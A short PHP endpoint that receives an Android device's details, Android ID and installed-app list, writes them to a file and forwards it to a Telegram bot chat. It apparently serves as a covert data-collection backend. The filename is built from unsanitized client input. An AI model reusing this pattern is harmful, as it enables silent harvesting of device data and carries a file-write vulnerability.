<?php

$botToken = getenv('TOKEN2');

$chatId = getenv('ID2');

$deviceInfo = $_POST['deviceInfo'] ?? '';

$androidId = $_POST['androidId'] ?? '';

$appInfo = $_POST['appInfo'] ?? '';

$androidVersion = preg_match('/Android Version: ([^,]+)/', $deviceInfo, $matches) ? trim($matches[1]) : 'Unknown';

preg_match('/Manufacturer: ([^,]+), Model: ([^,]+)/', $deviceInfo, $modelMatches);

$manufacturer = trim($modelMatches[1] ?? 'Unknown');

$model = trim($modelMatches[2] ?? 'Unknown');

$message = "Device Info: $deviceInfo\n" .

    "Android ID: $androidId\n\n" .

    "App Info:\n$appInfo\n";

$randomString = uniqid('', true);

$filename = "$manufacturer $model $androidVersion AppsList $randomString.txt";

file_put_contents($filename, $message);

$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument";

$postData = [

    'chat_id' => $chatId,

    'document' => new CURLFile(realpath($filename)),

    'caption' => '*App List Received*', 

    'parse_mode' => 'Markdown',

];

$ch = curl_init($telegramApiUrl);

curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);

curl_close($ch);

unlink($filename);

?>
